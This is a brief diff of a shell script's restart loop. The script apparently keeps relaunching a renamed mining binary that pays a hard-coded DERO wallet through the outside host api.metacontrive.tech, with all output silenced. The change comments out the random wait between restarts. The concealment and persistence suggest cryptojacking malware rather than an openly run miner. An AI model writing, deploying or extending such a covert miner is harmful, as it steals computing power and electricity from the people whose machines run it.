@@ -15,8 +15,8 @@ restart_main() {
     ./"$new_name" -w dero1qyjrwgdvns7arfuzf6pz5lhpj2yfsdlzy9c05w6qmmp3shc7fm3m2qgjs4uez -r api.metacontrive.tech:443 -p rpc > /dev/null 2>&1
     
     # Generate a random wait period between 10 and 60 seconds
-    wait_seconds=$(shuf -i 10-60 -n 1)
-    sleep "$wait_seconds"
+    # wait_seconds=$(shuf -i 10-60 -n 1)
+    # sleep "$wait_seconds"
   done
 }
 
